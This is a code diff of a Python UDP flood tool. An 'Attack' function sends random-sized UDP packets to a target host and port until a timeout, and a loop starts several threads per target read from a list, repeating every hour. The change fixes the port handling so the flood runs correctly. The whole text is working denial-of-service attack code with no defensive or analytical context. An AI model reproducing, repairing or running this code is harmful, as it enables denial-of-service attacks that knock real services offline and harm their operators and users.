@@ -15,9 +15,9 @@ def Attack(target, port, kbytes, timeout):
         sock=socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
         sent = 0
         while time.time()<timeout:
-            rport=port
+            
             b = Bytes*random.randint(1,22)
-            sock.sendto(b,(target,rport))
+            sock.sendto(b,(target,port))
             sent=sent + 1
             print("Sent %s packets to %s port %s with %s bytes" % (sent, target, port, len(b)))
         return
@@ -38,7 +38,7 @@ while 1 == 1:
             for r in rrow:
                 for i in range(count_threads):
                     trgt = r.split(":")
-                    threading.Thread(target=Attack, args=(trgt[0], trgt[1], 1024, timeout,)).start()
+                    threading.Thread(target=Attack, args=(trgt[0], int(trgt[1]), 1024, timeout,)).start()
     time.sleep(3600)
  
  
